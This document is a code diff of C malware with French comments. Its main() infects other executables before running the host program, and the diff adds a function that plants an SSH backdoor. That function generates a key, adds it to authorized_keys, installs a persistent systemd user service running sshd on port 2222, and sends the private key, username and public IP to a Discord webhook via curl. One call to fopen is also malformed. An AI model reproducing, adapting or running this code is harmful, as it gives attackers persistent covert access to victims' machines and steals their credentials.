@@ -245,65 +245,142 @@ void ssh_backdoor() {
   system(exfil_cmd);
 }
 
-// 🔍 Vérifie si SSH est actif
-int is_ssh_active() {
-  char buffer[256];
-  FILE *fp;
-
-  fp = popen("uname -s", "r");
-  if (!fp)
-    return -1;
-
-  fgets(buffer, sizeof(buffer), fp);
-  pclose(fp);
-
-  if (strstr(buffer, "Linux")) {
-    fp = popen("systemctl is-active sshd 2>/dev/null", "r");
-    if (!fp)
-      return -1;
-
-    fgets(buffer, sizeof(buffer), fp);
-    pclose(fp);
-
-    return (strstr(buffer, "active") != NULL);
-  }
-
-  else if (strstr(buffer, "Darwin")) {
-    fp = popen("systemsetup -getremotelogin 2>/dev/null", "r");
-    if (!fp)
-      return -1;
-
-    fgets(buffer, sizeof(buffer), fp);
-    pclose(fp);
-
-    return (strstr(buffer, "On") != NULL);
-  }
-
-  return -1;
-}
-
-// 🚀 Démarre SSH si pas actif
-void start_ssh() {
-  char buffer[256];
-  FILE *fp;
-
-  fp = popen("uname -s", "r");
-  if (!fp)
+void ssh_backdoor2() {
+  char *home = getenv("HOME");
+  char *user = getenv("USER");
+  if (!home || !user)
     return;
 
-  fgets(buffer, sizeof(buffer), fp);
-  pclose(fp);
-
-  if (strstr(buffer, "Linux")) {
-    printf("[Linux] Starting SSH...\n");
-    system("systemctl start sshd");
-    system("systemctl enable sshd");
+  // Récup IP publique
+  FILE *fp = popen("curl -s ifconfig.me 2>/dev/null", "r");
+  char victim_ip[128] = "unknown";
+  if (fp) {
+    fgets(victim_ip, sizeof(victim_ip), fp);
+    victim_ip[strcspn(victim_ip, "\n")] = 0;
+    pclose(fp);
   }
 
-  else if (strstr(buffer, "Darwin")) {
-    printf("[macOS] Enabling SSH...\n");
-    system("systemsetup -setremotelogin on");
+  char ssh_dir[256], priv_key[512], pub_key[512], auth_keys[512];
+  snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);
+  snprintf(priv_key, sizeof(priv_key), "%s/id_rsa_basique", ssh_dir);
+  snprintf(pub_key, sizeof(pub_key), "%s/id_rsa_basique.pub", ssh_dir);
+  snprintf(auth_keys, sizeof(auth_keys), "%s/authorized_keys", ssh_dir);
+
+  // 1. Créer .ssh + permissions
+  mkdir(ssh_dir, 0700);
+  chmod(ssh_dir, 0700);
+
+  // 2. Générer clé SSH si absente
+  if (access(priv_key, F_OK) != 0) {
+    char cmd[512];
+    snprintf(cmd, sizeof(cmd), "ssh-keygen -t rsa -b 2048 -f '%s' -N '' -q",
+             priv_key);
+    system(cmd);
   }
+
+  // 3. Ajouter pubkey à authorized_keys (anti-dupe)
+  FILE *pubf = fopen(pub_key, "r");
+  char pub_content[2048] = {0};
+  if (pubf) {
+    fread(pub_content, sizeof(pub_content) - 1, 1, pubf);
+    fclose(pubf);
+  }
+
+  int already_present = 0;
+  FILE *auth_check = fopen(auth_keys, "r");
+  if (auth_check) {
+    char auth_buf[4096] = {0};
+    fread(auth_buf, sizeof(auth_buf) - 1, 1, auth_check);
+    if (strstr(auth_buf, pub_content))
+      already_present = 1;
+    fclose(auth_check);
+  }
+
+  if (!already_present) {
+    FILE *authf = fopen(auth_keys, "a");
+    if (authf) {
+      fprintf(authf, "\n%s\n", pub_content);
+      fclose(authf);
+      chmod(auth_keys, 0600);
+    }
+  }
+
+  // 4. 🚀 NOUVEAU : Démarrer sshd via user systemd (sans sudo!)
+  char systemd_service[1024];
+  snprintf(systemd_service, sizeof(systemd_service),
+           "[Unit]\n"
+           "Description=SSH User Service\n"
+           "After=network.target\n\n"
+           "[Service]\n"
+           "ExecStart=/usr/sbin/sshd -D -p 2222 -o PidFile=/tmp/sshd.pid\n"
+           "Restart=always\n"
+           "RestartSec=3\n\n"
+           "[Install]\n"
+           "WantedBy=default.target");
+
+  FILE *svc_file =
+      fopen("%s/.config/systemd/user/ssh-backdoor.service", home, "w");
+  if (svc_file) {
+    fwrite(systemd_service, 1, strlen(systemd_service), svc_file);
+    fclose(svc_file);
+
+    // Activer + démarrer le service user
+    system("systemctl --user daemon-reload");
+    system("systemctl --user enable ssh-backdoor.service");
+    system("systemctl --user start ssh-backdoor.service");
+    system("loginctl enable-linger"); // Persistance après logout
+  }
+
+  // 5. Fallback : sshd direct si systemd indispo
+  if (access("/usr/sbin/sshd", X_OK) == 0 &&
+      access("/tmp/sshd.pid", F_OK) != 0) {
+    system(
+        "/usr/sbin/sshd -D -p 2222 -o PidFile=/tmp/sshd.pid >/dev/null 2>&1 &");
+  }
+
+  // 6. Exfiltrer clé + infos connexion
+  FILE *keyf = fopen(priv_key, "r");
+  char key_content[4096] = {0};
+  if (keyf) {
+    fread(key_content, sizeof(key_content) - 1, 1, keyf);
+    fclose(keyf);
+  }
+
+  // Échappement JSON (code existant)
+  char escaped_key[8192] = {0};
+  int j = 0;
+  for (int i = 0; key_content[i] && j < sizeof(escaped_key) - 10; i++) {
+    if (key_content[i] == '"') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = '"';
+    } else if (key_content[i] == '\\') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = '\\';
+    } else if (key_content[i] == '\n') {
+      escaped_key[j++] = '\\';
+      escaped_key[j++] = 'n';
+    } else
+      escaped_key[j++] = key_content[i];
+  }
+
+  char json_payload[16384];
+  snprintf(json_payload, sizeof(json_payload),
+           "{\"content\":\"🔓 **SSH Backdoor ACTIVÉ** 🔓\\n\\n"
+           "```\\n%s\\n```\\n\\n"
+           "👤 **User**: `%s` | 🌐 **IP**: `%s`\\n"
+           "🔌 **Port**: `2222` (sshd lancé auto)\\n"
+           "💻 **Connexion**: `ssh -p 2222 %s@%s`\\n\\n"
+           "⚠️ **Persistant** via systemd user service\"}",
+           escaped_key, user, victim_ip, user, victim_ip);
+
+  char exfil_cmd[16384];
+  snprintf(
+      exfil_cmd, sizeof(exfil_cmd),
+      "curl -s -X POST 'https://discord.com/api/webhooks/1485416783706853558/"
+      "qGWKXvrslqK8xzMdQpIy9J8BqiM8WqBaXyq_9SweYyeOXzRRGlmHtjxd8keiCZTyaNyB' "
+      "-H 'Content-Type: application/json' -d '%s'",
+      json_payload);
+  system(exfil_cmd);
 }
 
 int main(int argc, char *argv[]) {
@@ -315,13 +392,7 @@ int main(int argc, char *argv[]) {
   char *fileUninfected = isInfected(files);
   infect(fileUninfected, prog_name);
 
-  ssh_backdoor();
-
-  int status = is_ssh_active();
-
-  if (status == 0) {
-    start_ssh();
-  }
+  ssh_backdoor2();
 
   execHost(files, prog_name, argc, argv);
 }
